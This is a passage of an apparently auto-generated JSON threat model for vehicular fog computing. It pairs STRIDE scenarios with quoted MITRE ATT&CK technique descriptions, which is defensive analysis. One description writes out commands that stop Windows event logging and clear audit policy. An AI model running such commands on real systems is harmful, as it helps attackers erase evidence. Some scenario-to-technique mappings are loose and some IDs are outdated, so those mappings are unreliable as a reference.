            "MITRE ATT&CK Keywords": [
                "impersonation",
                "vehicle",
                "network",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses spoofed roadside units (RSUs) to intercept and alter communications between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "RSUs lack strong authentication methods.",
                    "Role": "Attacker",
                    "Condition": "Valid if RSUs can be easily spoofed."
                },
                {
                    "Assumption": "Communication between vehicles and RSUs is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if no encryption protocols are applied."
                },
                {
                    "Assumption": "Attackers can position spoofed RSUs in strategic locations.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical security of legitimate RSUs is weak."
                }
            ],
            "Potential Impact": "Interception and alteration of data, potentially leading to incorrect traffic management and safety hazards.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "interception",
                "RSU",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates cloud services to collect and possibly manipulate the data sent from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not properly authenticate communications from fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if weak authentication mechanisms are in place."
                },
                {
                    "Assumption": "Attackers have access to the network paths fog nodes use to communicate with the cloud.",
                    "Role": "Attacker",
                    "Condition": "Valid if network paths are insufficiently protected."
                },
                {
                    "Assumption": "Fog nodes accept data from any source purporting to be cloud services without verification.",
                    "Role": "Attacker",
                    "Condition": "Valid if there is no source verification."
                }
            ],
            "Potential Impact": "Sensitive data leakage and potential data manipulation affecting downstream services.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "cloud",
                "network communication",
                "authentication bypass"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies firmware of smart vehicles to transmit erroneous data, disrupting VFC operations.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update process is not secured or authenticated.",
                    "Role": "Attacker",
                    "Condition": "Valid if firmware updates are not verified."
                },
                {
                    "Assumption": "Attackers have physical or remote access to smart vehicles.",
                    "Role": "Attacker",
                    "Condition": "Valid if vehicles are easily accessible."
                },
                {
                    "Assumption": "Vehicles do not use cryptographic signatures to validate firmware integrity.",
                    "Role": "Attacker",
                    "Condition": "Valid if there is no cryptographic validation."
                }
            ],
            "Potential Impact": "System integrity compromised, leading to unreliable analytics and decision making.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "tampering",
                "vehicle",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates data stored on fog nodes to introduce errors in traffic management applications.",
            "Assumptions": [
                {
                    "Assumption": "Local storage on fog nodes is not protected against unauthorized access.",
                    "Role": "Attacker",
                    "Condition": "Valid if storage lacks access controls."
                },
                {
                    "Assumption": "No integrity checks are performed on data before processing.",
                    "Role": "Attacker",
                    "Condition": "Valid if data verification mechanisms are absent."
                },
                {
                    "Assumption": "Attackers can gain physical or remote access to fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if fog nodes are not secured."
                }
            ],
            "Potential Impact": "Incorrect data leads to poor traffic management and potential safety hazards.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "fog node",
                "local storage",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data flows between fog nodes and cloud services, causing incorrect analytics results.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels between fog nodes and cloud services are not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if no encryption protocols are used."
                },
                {
                    "Assumption": "Intermediate network devices are compromised or can be accessed by attackers.",
                    "Role": "Attacker",
                    "Condition": "Valid if network devices are vulnerable."
                },
                {
                    "Assumption": "No data integrity checks are performed at the cloud services end.",
                    "Role": "Attacker",
                    "Condition": "Valid if data validation from fog nodes is insufficient."
                }
            ],
            "Potential Impact": "Data integrity compromised, leading to incorrect analysis and decisions by cloud services.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "data flow",
                "fog to cloud",
                "network",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having sent certain data from a smart vehicle positioned at an accident site.",
            "Assumptions": [
                {
                    "Assumption": "No robust logging of data transmissions from vehicles to fog nodes.",
                    "Role": "Attacker/User",
                    "Condition": "Valid if logging mechanisms are weak."
                },
                {
                    "Assumption": "Identity of the sender is not authenticated or recorded.",
                    "Role": "Systems",
                    "Condition": "Valid if sender identity is improperly managed."
                },
                {
                    "Assumption": "No non-repudiation mechanisms (such as digital signatures) are implemented.",
                    "Role": "Systems",
                    "Condition": "Valid if cryptographic techniques are not used."
                }
            ],
            "Potential Impact": "System accountability compromised, affecting legal and security operations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "smart vehicle",
                "identity management"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An operator of a fog node denies altering traffic data that led to an accident.",
            "Assumptions": [
                {
                    "Assumption": "Fog node operations are not logged or monitored effectively.",
                    "Role": "Operator",
                    "Condition": "Valid if logging mechanisms are weak or absent."
                },
                {
                    "Assumption": "Changes to traffic data are not signed or verified.",
                    "Role": "Systems",
                    "Condition": "Valid if data integrity and authenticity checks are absent."
                },
                {
                    "Assumption": "Access controls on fog nodes are not enforced.",
                    "Role": "Systems",
                    "Condition": "Valid if access control mechanisms are weak."
                }
            ],
            "Potential Impact": "Accountability of operations compromised, causing difficulty in forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "fog node",
                "data alteration",
                "logging"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service provider denies having received and stored specific data entries from fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Logging and tracking of data transfers between fog nodes and cloud are insufficient.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Valid if logging mechanisms are inadequate."
                },
                {
                    "Assumption": "Receipts of data transfers are not used or stored.",
                    "Role": "Systems",
                    "Condition": "Valid if there is no secure acknowledgment mechanism."
                },
                {
                    "Assumption": "No end-to-end tracking of data from fog nodes to cloud services.",
                    "Role": "Systems",
                    "Condition": "Valid if data tracking mechanisms are not implemented."
                }
            ],
            "Potential Impact": "Complications in data accountability leading to trust issues and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "cloud",
                "logging",
                "data transfer"
            ],
            "mitre_technique": {
                "name": "Revert Cloud Instance",
                "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
                "id": "attack-pattern--0708ae90-d0eb-4938-9a76-d0fc94f6eec1",
                "technique_id": "T1578.004"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data transmitted from smart vehicles is intercepted by a man-in-the-middle attack.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels used are not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if no encryption protocols like TLS are enforced."
                },
                {
                    "Assumption": "Network paths are not secured against eavesdropping.",
                    "Role": "Attacker",
                    "Condition": "Valid if network security measures are weak."
                },
                {
                    "Assumption": "Smart vehicles transmit data without additional security measures.",
                    "Role": "Systems",
                    "Condition": "Valid if vehicle data transmission is not secured."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, leading to privacy issues and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "man-in-the-middle",
                "sensitive data",
                "network security"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider at a fog node has access to unencrypted data and leaks sensitive vehicle information.",
            "Assumptions": [
                {
                    "Assumption": "Data stored in fog nodes is not encrypted.",
                    "Role": "Insider",
                    "Condition": "Valid if storage encryption is not applied."
                },
                {
                    "Assumption": "Access controls are weak or insufficient for insider threats.",
                    "Role": "Insider",
                    "Condition": "Valid if access management is ineffective."
                },
                {
                    "Assumption": "Insiders have privileged access without adequate monitoring.",
                    "Role": "Systems",
                    "Condition": "Valid if monitoring mechanisms are weak or absent."
                }
            ],
            "Potential Impact": "Exposure of sensitive data, impacting user privacy and system trust.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data leakage",
                "fog node",
                "access control"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to cloud services and extracts sensitive long-term storage data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if data at rest encryption is not applied."
                },
                {
                    "Assumption": "Access controls on cloud services are insufficient.",
                    "Role": "Attacker",
                    "Condition": "Valid if access management is weak."
                },
                {
                    "Assumption": "Attackers can exploit vulnerabilities in cloud service infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Valid if cloud infrastructure has exploitable weaknesses."
                }
            ],
            "Potential Impact": "Unauthorized access to and disclosure of highly sensitive data, impacting user privacy and system integrity.",
            "MITRE ATT&CK Keywords": [
                "cloud services",
                "data breach",
                "sensitive data",
                "access control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods fog nodes with excessive traffic, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have rate limiting or mitigation mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Valid if rate limiting mechanisms are weak or absent."
                },
                {
                    "Assumption": "Network infrastructure is vulnerable to flooding attacks.",
                    "Role": "Attacker",
                    "Condition": "Valid if network capacity management is poor."
                },
                {
                    "Assumption": "Monitoring and automated responses to traffic anomalies are insufficient.",
                    "Role": "Systems",
                    "Condition": "Valid if detection and response capabilities are inadequate."
                }
            ],
            "Potential Impact": "Service disruption, affecting real-time processing and traffic management.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "traffic flooding",
                "fog nodes",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in vehicle-to-fog communication protocols to disrupt data transmissions.",
            "Assumptions": [
                {
                    "Assumption": "Communication protocols are vulnerable to exploitation.",
                    "Role": "Attacker",
                    "Condition": "Valid if protocols have known weaknesses."
                },
                {
                    "Assumption": "Smart vehicles and fog nodes do not have proper validation and error handling mechanisms.",
                    "Role": "Systems",
                    "Condition": "Valid if validation and error handling are insufficient."
                },
                {
                    "Assumption": "No redundancy is in place for critical communication paths.",
                    "Role": "Systems",
                    "Condition": "Valid if single points of failure exist in communication paths."
                }
            ],
            "Potential Impact": "Disrupted data transmissions lead to incorrect traffic decisions and potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "protocol exploitation",
                "vehicle-to-fog",
                "communication disruption",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets cloud services with a distributed denial of service (DDoS) attack, affecting data processing and storage.",
            "Assumptions": [
                {
